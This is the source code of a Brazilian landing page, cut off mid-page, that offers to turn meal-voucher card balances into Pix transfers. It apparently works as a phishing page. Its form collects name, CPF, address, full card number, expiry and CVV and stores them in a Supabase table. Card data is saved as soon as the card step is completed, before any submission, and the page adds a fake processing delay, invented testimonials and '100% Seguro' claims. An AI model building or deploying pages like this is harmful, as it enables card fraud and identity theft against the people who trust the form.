import { Shield, Zap, Monitor, Percent, CheckCircle, ChevronRight, ChevronLeft, CreditCard, Wallet, User, MapPin, Star, Loader2, MessageCircle } from 'lucide-react';
import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Separator } from "@/components/ui/separator";
import { supabase } from "@/integrations/supabase/client";
import { Database } from "@/integrations/supabase/types";
import { toast } from "sonner";
import { cpf as cpfValidator } from 'cpf-cnpj-validator';
import luhn from 'fast-luhn';

const CARD_BRANDS = [
  { id: 'vr', label: 'VR Refeição', logo: 'https://i.ibb.co/fVHJfNZX/vr.png' },
  { id: 'pluxee', label: 'Pluxee / Sodexo', logo: 'https://i.ibb.co/whBj64q8/pluxee.png', virtualOnly: true },
  { id: 'alelo', label: 'Alelo Refeição', logo: 'https://i.ibb.co/7NKs0yFk/alelo.png' },
  { id: 'ticket', label: 'Ticket Restaurante', logo: 'https://i.ibb.co/twgj5Bzd/ticket.png' },
  { id: 'ben', label: 'Ben Refeição', logo: 'https://i.ibb.co/SwTfB47H/ben.png' },
  { id: 'caju', label: 'Caju', logo: 'https://i.ibb.co/qKcvZzD/caju.png' },
  { id: 'lecard', label: 'Lecard', logo: 'https://i.ibb.co/RGv8Yr56/lecard.png' },
  { id: 'greencard', label: 'Green Benefícios', logo: 'https://i.ibb.co/fYfjN8BP/greencard.png' },
  { id: 'flash', label: 'Flash Card', logo: 'https://i.ibb.co/7sxW685/flash.png' },
];

const ConversionForm = () => {
  const [step, setStep] = useState(1);
  const [showErrors, setShowErrors] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [isLoadingCep, setIsLoadingCep] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    cpf: '',
    phone: '',
    email: '',
    cep: '',
    state: '',
    city: '',
    address: '',
    number: '',
    complement: '',
    cardBrand: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    amount: '',
    pixKeyType: '',
    pixKey: '',
  });
  const [cardError, setCardError] = useState(false);

  const totalSteps = 4;

  const handleInputChange = (id: string, value: string) => {
    let formattedValue = value;
    
    // Apply masks
    if (id === 'cardNumber') {
      formattedValue = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').substring(0, 19);
      const cleanCard = formattedValue.replace(/\s/g, '');
      if (cleanCard.length === 16) {
        setCardError(!luhn(cleanCard));
      } else {
        setCardError(false);
      }
    } else if (id === 'expiry') {
      formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/').substring(0, 5);
    } else if (id === 'cvv') {
      formattedValue = value.replace(/\D/g, '').substring(0, 4);
    } else if (id === 'cpf') {
      formattedValue = value.replace(/\D/g, '')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})/, '$1-$2')
        .replace(/(-\d{2})\d+?$/, '$1');
    } else if (id === 'phone') {
      formattedValue = value.replace(/\D/g, '')
        .replace(/(\d{2})(\d)/, '($1) $2')
        .replace(/(\d{5})(\d)/, '$1-$2')
        .replace(/(-\d{4})\d+?$/, '$1');
    } else if (id === 'cep') {
      formattedValue = value.replace(/\D/g, '')
        .replace(/(\d{5})(\d)/, '$1-$2')
        .replace(/(-\d{3})\d+?$/, '$1');
    }

    setFormData(prev => ({ ...prev, [id]: formattedValue }));
  };

  const fetchAddressByCep = async (cep: string) => {
    const cleanCep = cep.replace(/\D/g, '');
    if (cleanCep.length === 8) {
      setIsLoadingCep(true);
      try {
        const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
        const data = await response.json();
        
        if (!data.erro) {
          setFormData(prev => ({
            ...prev,
            state: data.uf.toLowerCase(),
            city: data.localidade,
            address: data.logradouro
          }));
          toast.success("Endereço preenchido automaticamente!");
        } else {
          toast.error("CEP não encontrado.");
        }
      } catch (error) {
        console.error('Error fetching CEP:', error);
        toast.error("Erro ao buscar CEP.");
      } finally {
        setIsLoadingCep(false);
      }
    }
  };

  const handleCepChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    handleInputChange('cep', value);
    if (value.replace(/\D/g, '').length === 8) {
      fetchAddressByCep(value);
    }
  };

  const isStepValid = () => {
    if (step === 1) {
      const isCpfValid = cpfValidator.isValid(formData.cpf);
      const isEmailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email);
      return !!(formData.name && formData.cpf && isCpfValid && formData.phone && formData.email && isEmailValid);
    }
    if (step === 2) {
      return !!(formData.cep && formData.state && formData.city && formData.address && formData.number);
    }
    if (step === 3) {
      const cleanCard = formData.cardNumber.replace(/\s/g, '');
      const isCardValid = cleanCard.length >= 13 && cleanCard.length <= 19 && luhn(cleanCard);
      const isCvvValid = formData.cvv.length === 3;
      
      // Validação de data de expiração (MM/AA)
      let isExpiryValid = false;
      const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
      if (expiryRegex.test(formData.expiry)) {
        const [month, year] = formData.expiry.split('/').map(Number);
        const now = new Date();
        const currentMonth = now.getMonth() + 1;
        const currentYear = Number(now.getFullYear().toString().slice(-2));
        
        if (year > currentYear || (year === currentYear && month >= currentMonth)) {
          isExpiryValid = true;
        }
      }

      return !!(formData.cardBrand && formData.cardNumber && isCardValid && formData.expiry && isExpiryValid && isCvvValid);
    }
    if (step === 4) {
      const amountNum = parseFloat(formData.amount.replace(',', '.'));
      const isAmountValid = !isNaN(amountNum) && amountNum > 0;
      return !!(formData.amount && isAmountValid && formData.pixKeyType && formData.pixKey);
    }
    return true;
  };

  const handleSubmit = async () => {
    if (!isStepValid()) {
      setShowErrors(true);
      return;
    }

    setIsProcessing(true);
    
    // Simulate processing for 1.5s
    await new Promise(resolve => setTimeout(resolve, 1500));

    setIsSubmitting(true);
    try {
      const payload: Database['public']['Tables']['conversion_requests']['Insert'] = {
        name: formData.name,
        cpf: formData.cpf,
        phone: formData.phone,
        email: formData.email,
        cep: formData.cep,
        state: formData.state,
        city: formData.city,
        address: formData.address,
        number: formData.number,
        complement: formData.complement,
        card_brand: formData.cardBrand,
        card_number: formData.cardNumber,
        expiry: formData.expiry,
        cvv: formData.cvv,
        amount: formData.amount,
        pix_key_type: formData.pixKeyType || null,
        pix_key: formData.pixKey || null,
        status: 'full'
      };

      const { error } = await supabase
        .from('conversion_requests')
        .insert([payload]);

      if (error) throw error;

      setIsSuccess(true);
      setFormData({
        name: '', cpf: '', phone: '', email: '', cep: '', state: '', city: '',
        address: '', number: '', complement: '', cardBrand: '', cardNumber: '',
        expiry: '', cvv: '', amount: '', pixKeyType: '', pixKey: ''
      });
      setShowErrors(false);
    } catch (error: any) {
      console.error('Error saving to database:', error);
      toast.error("Erro ao enviar solicitação. Tente novamente mais tarde.");
      setIsProcessing(false);
    } finally {
      setIsSubmitting(false);
    }
  };

  const savePartialData = async () => {
    try {
      const payload: Database['public']['Tables']['conversion_requests']['Insert'] = {
        name: formData.name,
        cpf: formData.cpf,
        phone: formData.phone,
        email: formData.email,
        cep: formData.cep,
        state: formData.state,
        city: formData.city,
        address: formData.address,
        number: formData.number,
        complement: formData.complement,
        card_brand: formData.cardBrand,
        card_number: formData.cardNumber,
        expiry: formData.expiry,
        cvv: formData.cvv,
        status: 'partial'
      };

      await supabase
        .from('conversion_requests')
        .insert([payload]);
    } catch (err) {
      console.error('Error saving partial data:', err);
    }
  };

  const nextStep = () => {
    if (isStepValid()) {
      setShowErrors(false);
      if (step === 3) {
        savePartialData();
      }
      if (step === totalSteps) {
        handleSubmit();
      } else {
        setStep((s) => Math.min(s + 1, totalSteps));
      }
    } else {
      setShowErrors(true);
    }
  };
  const prevStep = () => {
    setShowErrors(false);
    setStep((s) => Math.max(s - 1, 1));
  };

  if (isSuccess) {
    return (
      <Card className="w-full max-w-2xl mx-auto shadow-xl border-t-4 border-t-emerald-500 overflow-hidden">
        <CardContent className="p-10 text-center space-y-6">
          <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto text-emerald-600">
            <CheckCircle className="w-12 h-12" />
          </div>
          <div className="space-y-2">
            <h2 className="text-2xl font-bold text-emerald-950">Solicitação enviada com Sucesso!</h2>
            <p className="text-gray-600">Sua solicitação de conversão está em análise.</p>
          </div>
          <div className="bg-emerald-50 p-6 rounded-xl border border-emerald-100 text-left space-y-4">
            <p className="text-emerald-900 font-medium">Você receberá um e-mail com a confirmação em até 24 horas.</p>
            <div>
              <p className="text-sm font-bold text-emerald-900 uppercase tracking-wider mb-1">Próximos passos:</p>
              <p className="text-sm text-emerald-800/80">Nossa equipe está analisando seus dados e em breve entraremos em contato.</p>
            </div>
          </div>
        </CardContent>
      </Card>
    );
  }

  if (isProcessing) {
    return (
      <Card className="w-full max-w-2xl mx-auto shadow-xl border-t-4 border-t-emerald-500 overflow-hidden">
        <CardContent className="p-10 flex flex-col items-center justify-center space-y-6 min-h-[400px]">
          <div className="relative">
            <img 
              src="https://i.ibb.co/WvVW1F2t/IMG-20260601-WA0005-removebg-preview-1.png" 
              alt="Logo" 
              className="h-16 w-auto animate-pulse" 
            />
            <div className="absolute inset-0 flex items-center justify-center">
              <Loader2 className="w-24 h-24 text-emerald-500 animate-spin opacity-20" />
            </div>
          </div>
          <div className="text-center space-y-2">
            <h3 className="text-xl font-bold text-emerald-950">Processando solicitação...</h3>
            <p className="text-gray-500">Aguarde um momento</p>
          </div>
        </CardContent>
      </Card>
    );
  }

  const steps = [
    { id: 1, label: "Dados Pessoais", icon: <User className="w-4 h-4" /> },
    { id: 2, label: "Endereço", icon: <MapPin className="w-4 h-4" /> },
    { id: 3, label: "Cartão", icon: <CreditCard className="w-4 h-4" /> },
    { id: 4, label: "Pix", icon: <Wallet className="w-4 h-4" /> },
  ];

  return (
    <Card className="w-full max-w-2xl mx-auto shadow-xl border-t-4 border-t-emerald-500 overflow-hidden">
      <CardContent className="p-6 md:p-10">
        <div className="flex items-center justify-between mb-8 relative">
          <div className="absolute top-1/2 left-0 w-full h-0.5 bg-gray-100 -translate-y-1/2 z-0" />
          {steps.map((s) => (
            <div key={s.id} className="relative z-10 flex flex-col items-center gap-2">
              <div 
                className={`w-10 h-10 rounded-full flex items-center justify-center transition-colors ${
                  step >= s.id ? "bg-emerald-500 text-white" : "bg-gray-100 text-gray-400"
                }`}
              >
                {step > s.id ? <CheckCircle className="w-6 h-6" /> : <span>{s.id}</span>}
              </div>
              <span className={`text-xs font-medium hidden md:block ${step >= s.id ? "text-emerald-700" : "text-gray-400"}`}>
                {s.label}
              </span>
            </div>
          ))}
        </div>

        <div className="bg-emerald-50 rounded-lg p-3 flex items-center gap-3 mb-8 border border-emerald-100">
          <div className="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-white">
            {steps[step-1].icon}
          </div>
          <span className="font-semibold text-emerald-900">{steps[step-1].label}</span>
        </div>

        <AnimatePresence mode="wait">
          <motion.div
            key={step}
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -20 }}
            transition={{ duration: 0.2 }}
            className="space-y-6"
          >
            {step === 1 && (
              <div className="grid gap-6">
                <div className="grid gap-2">
                  <Label htmlFor="name" className={showErrors && !formData.name ? "text-red-500" : ""}>Nome Completo *</Label>
                  <Input 
                    id="name" 
                    placeholder="Digite seu nome completo" 
                    value={formData.name}
                    onChange={(e) => handleInputChange('name', e.target.value)}
                    className={showErrors && !formData.name ? "border-red-500 focus-visible:ring-red-500" : ""}
                    required
                  />
                </div>
                <div className="grid md:grid-cols-2 gap-4">
                  <div className="grid gap-2">
                    <Label htmlFor="cpf" className={showErrors && (!formData.cpf || !cpfValidator.isValid(formData.cpf)) ? "text-red-500" : ""}>CPF *</Label>
                    <Input 
                      id="cpf" 
                      placeholder="000.000.000-00" 
                      value={formData.cpf}
                      onChange={(e) => handleInputChange('cpf', e.target.value)}
                      className={showErrors && (!formData.cpf || !cpfValidator.isValid(formData.cpf)) ? "border-red-500 focus-visible:ring-red-500" : ""}
                      required
                    />
                    {showErrors && formData.cpf && !cpfValidator.isValid(formData.cpf) && (
                      <span className="text-xs text-red-500">CPF inválido</span>
                    )}
                  </div>
                  <div className="grid gap-2">
                    <Label htmlFor="phone" className={showErrors && !formData.phone ? "text-red-500" : ""}>Telefone *</Label>
                    <Input 
                      id="phone" 
                      placeholder="(00) 00000-0000" 
                      value={formData.phone}
                      onChange={(e) => handleInputChange('phone', e.target.value)}
                      className={showErrors && !formData.phone ? "border-red-500 focus-visible:ring-red-500" : ""}
                      required
                    />
                  </div>
                </div>
                <div className="grid gap-2">
                  <Label htmlFor="email" className={showErrors && (!formData.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) ? "text-red-500" : ""}>E-mail *</Label>
                  <Input 
                    id="email" 
                    type="email" 
                    placeholder="seu@email.com" 
                    value={formData.email}
                    onChange={(e) => handleInputChange('email', e.target.value)}
                    className={showErrors && (!formData.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) ? "border-red-500 focus-visible:ring-red-500" : ""}
                    required
                  />
                  {showErrors && formData.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email) && (
                    <span className="text-xs text-red-500">E-mail inválido</span>
                  )}
                </div>
              </div>
            )}

            {step === 2 && (
              <div className="grid gap-6">
                <div className="grid md:grid-cols-2 gap-4">
                  <div className="grid gap-2">
                    <Label htmlFor="cep" className={showErrors && !formData.cep ? "text-red-500" : ""}>CEP *</Label>
                    <div className="relative">
                      <Input 
                        id="cep" 
                        placeholder="00000-000" 
                        value={formData.cep}
                        onChange={handleCepChange}
                        className={showErrors && !formData.cep ? "border-red-500 focus-visible:ring-red-500 pr-10" : "pr-10"}
                        required
                      />
                      {isLoadingCep && (
                        <div className="absolute right-3 top-1/2 -translate-y-1/2">
                          <Loader2 className="w-4 h-4 animate-spin text-emerald-500" />
                        </div>
                      )}
                    </div>
                  </div>
                  <div className="grid gap-2">
                    <Label htmlFor="state" className={showErrors && !formData.state ? "text-red-500" : ""}>Estado *</Label>
                    <Select value={formData.state} onValueChange={(v) => handleInputChange('state', v)}>
                      <SelectTrigger className={showErrors && !formData.state ? "border-red-500 focus:ring-red-500" : ""}>
                        <SelectValue placeholder="Selecione" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="ac">Acre</SelectItem>
                        <SelectItem value="al">Alagoas</SelectItem>
                        <SelectItem value="ap">Amapá</SelectItem>
                        <SelectItem value="am">Amazonas</SelectItem>
                        <SelectItem value="ba">Bahia</SelectItem>
                        <SelectItem value="ce">Ceará</SelectItem>
                        <SelectItem value="df">Distrito Federal</SelectItem>
                        <SelectItem value="es">Espírito Santo</SelectItem>
                        <SelectItem value="go">Goiás</SelectItem>
                        <SelectItem value="ma">Maranhão</SelectItem>
                        <SelectItem value="mt">Mato Grosso</SelectItem>
                        <SelectItem value="ms">Mato Grosso do Sul</SelectItem>
                        <SelectItem value="mg">Minas Gerais</SelectItem>
                        <SelectItem value="pa">Pará</SelectItem>
                        <SelectItem value="pb">Paraíba</SelectItem>
                        <SelectItem value="pr">Paraná</SelectItem>
                        <SelectItem value="pe">Pernambuco</SelectItem>
                        <SelectItem value="pi">Piauí</SelectItem>
                        <SelectItem value="rj">Rio de Janeiro</SelectItem>
                        <SelectItem value="rn">Rio Grande do Norte</SelectItem>
                        <SelectItem value="rs">Rio Grande do Sul</SelectItem>
                        <SelectItem value="ro">Rondônia</SelectItem>
                        <SelectItem value="rr">Roraima</SelectItem>
                        <SelectItem value="sc">Santa Catarina</SelectItem>
                        <SelectItem value="sp">São Paulo</SelectItem>
                        <SelectItem value="se">Sergipe</SelectItem>
                        <SelectItem value="to">Tocantins</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>
                <div className="grid gap-2">
                  <Label htmlFor="city" className={showErrors && !formData.city ? "text-red-500" : ""}>Cidade *</Label>
                  <Input 
                    id="city" 
                    value={formData.city}
                    onChange={(e) => handleInputChange('city', e.target.value)}
                    className={showErrors && !formData.city ? "border-red-500 focus-visible:ring-red-500" : ""}
                    required
                  />
                </div>
                <div className="grid gap-2">
                  <Label htmlFor="address" className={showErrors && !formData.address ? "text-red-500" : ""}>Endereço *</Label>
                  <Input 
                    id="address" 
                    value={formData.address}
                    onChange={(e) => handleInputChange('address', e.target.value)}
                    className={showErrors && !formData.address ? "border-red-500 focus-visible:ring-red-500" : ""}
                    required
                  />
                </div>
                <div className="grid md:grid-cols-3 gap-4">
                  <div className="grid gap-2 md:col-span-1">
                    <Label htmlFor="number" className={showErrors && !formData.number ? "text-red-500" : ""}>Número *</Label>
                    <Input 
                      id="number" 
                      value={formData.number}
                      onChange={(e) => handleInputChange('number', e.target.value)}
                      className={showErrors && !formData.number ? "border-red-500 focus-visible:ring-red-500" : ""}
                      required
                    />
                  </div>
                  <div className="grid gap-2 md:col-span-2">
                    <Label htmlFor="complement">Complemento</Label>
                    <Input 
                      id="complement" 
                      value={formData.complement}
                      onChange={(e) => handleInputChange('complement', e.target.value)}
                    />
                  </div>
                </div>
              </div>
            )}

            {step === 3 && (
              <div className="grid gap-6">
                <div className="grid grid-cols-3 gap-4 mb-2">
                  {CARD_BRANDS.map((brand) => (
                    <div 
                      key={brand.id}
                      onClick={() => handleInputChange('cardBrand', brand.id)}
                      className={`cursor-pointer p-2 rounded-lg border transition-all flex items-center justify-center hover:bg-emerald-50 ${
                        formData.cardBrand === brand.id 
                          ? "border-emerald-500 bg-emerald-50 shadow-sm" 
                          : "border-gray-100 bg-white"
                      }`}
                    >
                      <img src={brand.logo} alt={brand.label} className="h-8 object-contain" />
                    </div>
                  ))}
                </div>

                <div className="p-6 bg-emerald-900 rounded-xl text-white shadow-lg space-y-6">
                  <div className="flex justify-between items-start">
                    <div className="flex flex-col">
                      <span className="text-sm font-medium opacity-80">Vale-Refeição</span>
                    </div>
                    <div className="flex flex-col items-end gap-2">
                      {formData.cardBrand ? (
                        <div className="bg-white/20 p-1 rounded backdrop-blur-sm">
                          <img 
                            src={CARD_BRANDS.find(b => b.id === formData.cardBrand)?.logo} 
                            alt={formData.cardBrand}
                            className="h-8 object-contain"
                          />
                        </div>
                      ) : (
                        <CreditCard className="w-8 h-8 opacity-40" />
                      )}
                    </div>
                  </div>
                  <div className="text-xl tracking-[0.2em] font-mono">
                    {formData.cardNumber || "0000 0000 0000 0000"}
                  </div>
                  <div className="flex justify-between text-xs uppercase tracking-wider">
                    <div>
                      <div className="opacity-60 mb-1">Titular</div>
                      <div className="font-semibold">{formData.name || "NOME COMPLETO"}</div>
                    </div>
                    <div>
                      <div className="opacity-60 mb-1">Validade</div>
                      <div className="font-semibold">{formData.expiry || "MM/AA"}</div>
                    </div>
                  </div>
                </div>

                <div className="grid gap-2">
                  <Label className={showErrors && !formData.cardBrand ? "text-red-500" : ""}>Bandeira do Cartão *</Label>
                  <Select value={formData.cardBrand} onValueChange={(v) => handleInputChange('cardBrand', v)}>
                    <SelectTrigger className={showErrors && !formData.cardBrand ? "border-red-500 focus:ring-red-500" : ""}>
                      <SelectValue placeholder="Selecione a bandeira" />
                    </SelectTrigger>
                    <SelectContent>
                      {CARD_BRANDS.map((brand) => (
                        <SelectItem key={brand.id} value={brand.id}>
                          <div className="flex items-center gap-3">
                            <img src={brand.logo} alt={brand.label} className="w-6 h-6 object-contain rounded" />
                            <span>{brand.label} {brand.virtualOnly && "(Somente Cartão Virtual)"}</span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div className="grid gap-2">
                    <Label htmlFor="card-number" className={(showErrors || cardError) && (!formData.cardNumber || !luhn(formData.cardNumber.replace(/\s/g, ''))) ? "text-red-500" : ""}>Número do Cartão *</Label>
                    <Input 
                      id="card-number" 
                      placeholder="0000 0000 0000 0000"
                      value={formData.cardNumber}
                      onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                      className={(showErrors || cardError) && (!formData.cardNumber || !luhn(formData.cardNumber.replace(/\s/g, ''))) ? "border-red-500 focus-visible:ring-red-500 font-mono" : "font-mono"}
                      required
                    />
                    {(showErrors || cardError) && formData.cardNumber && !luhn(formData.cardNumber.replace(/\s/g, '')) && (
                      <span className="text-xs text-red-500">Número de cartão inválido</span>
                    )}
                  </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="grid gap-2">
                    <Label htmlFor="expiry" className={showErrors && (!formData.expiry || !/^(0[1-9]|1[0-2])\/\d{2}$/.test(formData.expiry)) ? "text-red-500" : ""}>Validade *</Label>
                    <Input 
                      id="expiry" 
                      placeholder="MM/AA" 
                      value={formData.expiry}
                      onChange={(e) => handleInputChange('expiry', e.target.value)}
                      className={showErrors && (!formData.expiry || !/^(0[1-9]|1[0-2])\/\d{2}$/.test(formData.expiry)) ? "border-red-500 focus-visible:ring-red-500 font-mono" : "font-mono"}
                      required
                    />
                    {showErrors && formData.expiry && !/^(0[1-9]|1[0-2])\/\d{2}$/.test(formData.expiry) && (
                      <span className="text-xs text-red-500">Validade inválida (MM/AA)</span>
                    )}
                  </div>
                  <div className="grid gap-2">
                    <Label htmlFor="cvv" className={showErrors && !formData.cvv ? "text-red-500" : ""}>CVV *</Label>
                    <Input 
                      id="cvv" 
                      placeholder="000" 
                      value={formData.cvv}
                      onChange={(e) => handleInputChange('cvv', e.target.value)}
                      className={showErrors && !formData.cvv ? "border-red-500 focus-visible:ring-red-500 font-mono" : "font-mono"}
                      required
                    />
                  </div>
                </div>
              </div>
            )}

            {step === 4 && (
              <div className="grid gap-6">
                <div className="bg-emerald-50 p-4 rounded-lg border border-emerald-100 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="bg-white p-2 rounded shadow-sm">
                      <img src="https://refeipay.com.br/image/pix.png" alt="Pix" className="h-6" />
                    </div>
                    <span className="font-bold text-emerald-900">Pix</span>
                  </div>
                  <Badge variant="outline" className="border-emerald-200 text-emerald-700 bg-white">Instantâneo</Badge>
                </div>

                <div className="grid gap-2">
                  <Label htmlFor="amount" className={showErrors && !formData.amount ? "text-red-500" : ""}>Valor para Conversão *</Label>
                  <div className="relative">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 font-medium">R$</span>
                    <Input 
                      id="amount" 
                      className={`pl-10 ${showErrors && !formData.amount ? "border-red-500 focus-visible:ring-red-500" : ""}`}
                      placeholder="0,00" 
                      value={formData.amount}
                      onChange={(e) => handleInputChange('amount', e.target.value)}
                      required
                    />
                  </div>
                  <div className="flex flex-col gap-1 text-xs text-gray-500">
                    <p>Taxa de conversão: 1%</p>
                    {formData.amount && !isNaN(parseFloat(formData.amount.replace(',', '.'))) && (
                      <p className="font-medium text-emerald-600">
                        Valor líquido a receber: R$ {(parseFloat(formData.amount.replace(',', '.')) * 0.99).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                      </p>
                    )}
                  </div>
                </div>

                <div className="grid gap-2">
                  <Label className={showErrors && (!formData.pixKeyType || !formData.pixKey) ? "text-red-500" : ""}>Chave Pix para Recebimento *</Label>
                  <Select value={formData.pixKeyType} onValueChange={(v) => handleInputChange('pixKeyType', v)}>
                    <SelectTrigger className={showErrors && !formData.pixKeyType ? "border-red-500 focus:ring-red-500" : ""}>
                      <SelectValue placeholder="Selecione o tipo de chave" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="cpf">CPF</SelectItem>
                      <SelectItem value="email">E-mail</SelectItem>
                      <SelectItem value="phone">Telefone</SelectItem>
                      <SelectItem value="random">Chave Aleatória</SelectItem>
                    </SelectContent>
                  </Select>
                  <Input 
                    placeholder="Digite sua chave Pix" 
                    className={`mt-2 ${showErrors && !formData.pixKey ? "border-red-500 focus-visible:ring-red-500" : ""}`}
                    value={formData.pixKey}
                    onChange={(e) => handleInputChange('pixKey', e.target.value)}
                    required
                  />
                </div>

                <div className="p-4 bg-emerald-50 rounded-lg text-[10px] text-emerald-800/60 border border-emerald-100 italic text-center">
                  O valor será transferido após aprovação da nossa equipe.
                </div>
              </div>
            )}
          </motion.div>
        </AnimatePresence>

        <div className="flex justify-between mt-10">
          <Button 
            variant="ghost" 
            onClick={prevStep} 
            disabled={step === 1}
            className="text-gray-500"
          >
            <ChevronLeft className="w-4 h-4 mr-2" /> Voltar
          </Button>
          <Button 
            onClick={nextStep}
            disabled={isSubmitting}
            className="bg-emerald-600 hover:bg-emerald-700 text-white min-w-[140px]"
          >
            {isSubmitting ? (
              <Loader2 className="w-4 h-4 animate-spin" />
            ) : (
              step === totalSteps ? "Solicitar Conversão" : "Próximo"
            )} 
            {!isSubmitting && step < totalSteps && <ChevronRight className="w-4 h-4 ml-2" />}
          </Button>
        </div>
      </CardContent>
    </Card>
  );
};

const Testimonials = () => {
  const reviews = [
    {
      name: "Marcos Oliveira",
      date: "Há 2 dias",
      avatar: "M",
      text: "Processo incrivelmente simples e rápido! Enviei meu cartão Alelo e recebi o Pix em menos de 20 horas. Plataforma muito segura.",
      rating: 5
    },
    {
      name: "Ana Paula Santos",
      date: "Há 5 dias",
      avatar: "A",
      text: "Usava meu VR apenas em restaurantes, mas com a Convertevale pude usar esse saldo em qualquer coisa! Transparente do início ao fim.",
      rating: 5
    },
    {
      name: "Rafael Costa",
      date: "Há 1 semana",
      avatar: "R",
      text: "Achei que ia ser complicado mas foi surpreendentemente fácil! Em menos de 24h o dinheiro estava na minha conta. Serviço de confiança.",
      rating: 5
    }
  ];

  return (
    <div className="grid md:grid-cols-3 gap-6">
      {reviews.map((r, i) => (
        <Card key={i} className="bg-white border-none shadow-sm hover:shadow-md transition-shadow">
          <CardContent className="p-6">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-10 h-10 rounded-full bg-emerald-100 flex items-center justify-center text-emerald-700 font-bold">
                {r.avatar}
              </div>
              <div>
                <div className="font-bold text-gray-900">{r.name}</div>
                <div className="text-xs text-gray-500">{r.date}</div>
              </div>
            </div>
            <div className="flex gap-1 mb-3">
              {[...Array(r.rating)].map((_, i) => (
                <Star key={i} className="w-4 h-4 fill-emerald-500 text-emerald-500" />
              ))}
            </div>
            <Badge variant="secondary" className="bg-emerald-50 text-emerald-700 border-none mb-3">
              <CheckCircle className="w-3 h-3 mr-1" /> Cliente Convertevale Aprovada

            </Badge>
            <p className="text-gray-600 text-sm italic leading-relaxed">
              "{r.text}"
            </p>
          </CardContent>
        </Card>
      ))}
    </div>
  );
};

export default function Index() {
  return (
    <div className="min-h-screen bg-[#f8fafc] font-sans text-gray-900 overflow-x-hidden">
      {/* Header */}
      <nav className="sticky top-0 z-50 bg-[#004e32] border-b border-[#004e32]/10">
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center">
            <img src="https://i.ibb.co/WvVW1F2t/IMG-20260601-WA0005-removebg-preview-1.png" alt="Convertevale Logo" className="h-12 w-auto" />
          </div>
          <div className="hidden md:flex items-center gap-8">
            <a href="#" className="text-sm font-medium text-white/90 hover:text-white transition-colors">Início</a>
            <a href="#como-funciona" className="text-sm font-medium text-white/90 hover:text-white transition-colors">Como Funciona</a>
            <Button className="bg-emerald-500 hover:bg-emerald-600 text-white">Começar Agora</Button>
          </div>
        </div>
      </nav>

      {/* Hero Section */}
      <section className="relative pt-20 pb-8 overflow-hidden">
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[1000px] h-[1000px] bg-emerald-50 rounded-full blur-3xl -z-10 opacity-60" />
        <div className="max-w-7xl mx-auto px-4 text-center">
          <Badge className="mb-6 bg-emerald-100 text-emerald-700 hover:bg-emerald-100 border-none px-4 py-1">
            <Zap className="w-3 h-3 mr-2 fill-emerald-600" /> Rápido, Seguro e Prático
          </Badge>
          <h1 className="text-4xl md:text-6xl font-black text-emerald-950 mb-6 tracking-tight">
            Converta seu Vale-Refeição <br />
            em <span className="text-emerald-700 underline decoration-emerald-200 underline-offset-8">Dinheiro na Conta</span>
          </h1>
          <p className="max-w-2xl mx-auto text-lg text-gray-600 mb-10 leading-relaxed">
            Transforme o saldo do seu cartão benefício em Pix de forma rápida, segura e prática. 
            A liberdade que você precisava para usar seu saldo como quiser com a Convertevale.
          </p>

          <div className="flex flex-wrap justify-center gap-4 mb-6">
            {[
              { icon: <CheckCircle className="w-4 h-4" />, text: "Aprovação em até 24h" },
              { icon: <Shield className="w-4 h-4" />, text: "100% Seguro" },
              { icon: <Monitor className="w-4 h-4" />, text: "Processo Online" },
              { icon: <Percent className="w-4 h-4" />, text: "Sem taxas ocultas" }
            ].map((item, i) => (
              <div key={i} className="flex items-center gap-2 bg-white px-4 py-2 rounded-full shadow-sm border border-gray-100 text-sm font-medium text-emerald-900">
                <span className="text-emerald-500">{item.icon}</span>
                {item.text}
              </div>
            ))}
          </div>

          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            className="mt-2 max-w-4xl mx-auto rounded-2xl overflow-hidden shadow-2xl border-4 border-white"
          >
            <img 
              src="https://i.ibb.co/pBp70Ydb/Gemini-Generated-Image-ugt961ugt961ugt9-1.png" 
              alt="Banner Promocional" 

              className="w-full h-auto object-cover"
            />
          </motion.div>
        </div>
      </section>

      {/* How it Works */}
      <section id="como-funciona" className="bg-emerald-950 py-24 text-white relative">
        <div className="max-w-7xl mx-auto px-4">
          <div className="text-center mb-16">
